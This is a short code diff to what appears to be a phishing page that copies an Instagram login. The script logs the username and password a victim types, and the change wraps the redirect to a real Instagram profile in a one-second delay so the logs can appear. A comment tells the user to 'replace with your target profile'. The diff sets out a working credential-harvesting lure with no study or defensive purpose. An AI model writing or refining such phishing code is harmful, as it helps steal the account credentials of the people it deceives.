@@ -63,8 +63,10 @@
       console.log("📥 Username entered:", user);
       console.log("🔐 Password entered:", pass);
 
-      // redirect to real Insta profile
-      window.location.href = "https://instagram.com/marsha_cute_bea"; // replace with your target profile
+      // Delay the redirect to give time for console logs to appear
+      setTimeout(function() {// redirect to real Insta profile
+        window.location.href = "https://instagram.com/marsha_cute_bea"; // replace with your target profile
+      }, 1000); // Delay 1 second
     }
   </script>
 
